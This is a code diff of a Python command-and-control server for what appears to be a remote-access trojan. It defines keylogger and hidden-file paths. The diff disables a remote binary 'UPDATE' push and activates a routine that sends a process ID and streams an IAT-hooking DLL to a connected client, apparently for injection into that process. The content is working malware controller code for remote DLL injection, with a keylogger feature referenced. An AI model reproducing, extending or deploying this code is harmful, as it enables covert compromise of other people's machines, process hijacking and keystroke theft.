@@ -4,7 +4,7 @@ from threading import Thread
 import time
 from SocketManager import SocketManager
 
-IAT_HOOKING_PROCESS_ID = 10904
+IAT_HOOKING_PROCESS_ID = 12152
 IAT_HOOKING_DLL = r"IAT Hooking\\IATHookingDLL.dll"
 KEY_LOGGER_FILE = r"keyLogger.txt"
 HIDDEN_FILE_PATH = r"C:\Users\admin\Desktop\hidden files.txt"
@@ -51,12 +51,12 @@ if __name__ == '__main__':
         print('received data:', data)
         SocketManager.send_data(conn, data)
 
-        # UPDATE:
-        SocketManager.send_data(conn, "UPDATE")
-        for chunk in bin_file_to_buffer(FILE_PATH_TO_UPDATE):
-            SocketManager.send_data(conn, chunk)
-
-        SocketManager.send_data(conn, "END_UPDATE")
+        # # UPDATE:
+        # SocketManager.send_data(conn, "UPDATE")
+        # for chunk in bin_file_to_buffer(FILE_PATH_TO_UPDATE):
+        #     SocketManager.send_data(conn, chunk)
+        #
+        # SocketManager.send_data(conn, "END_UPDATE")
 
         # Execute
         # SocketManager.send_data(conn, "EXECUTE")
@@ -139,15 +139,13 @@ if __name__ == '__main__':
         # is_running_key_logger = False
 
 
-        # # IAT Hooking
-        # SocketManager.send_data(conn, "IAT_HOOKING")
-        # SocketManager.send_data(conn, str(IAT_HOOKING_PROCESS_ID))
-        # # dll_data = full_bin_file_to_buffer(IAT_HOOKING_DLL)
-        # #SocketManager.send_data(conn, dll_data)
-        #
-        # for chunk in bin_file_to_buffer(IAT_HOOKING_DLL):
-        #     SocketManager.send_data(conn, chunk)
-        #
-        # SocketManager.send_data(conn, "END_IAT_HOOKING")
+        # IAT Hooking
+        SocketManager.send_data(conn, "IAT_HOOKING")
+        SocketManager.send_data(conn, str(IAT_HOOKING_PROCESS_ID))
+
+        for chunk in bin_file_to_buffer(IAT_HOOKING_DLL):
+            SocketManager.send_data(conn, chunk)
+
+        SocketManager.send_data(conn, "END_IAT_HOOKING")
 
 conn.close()
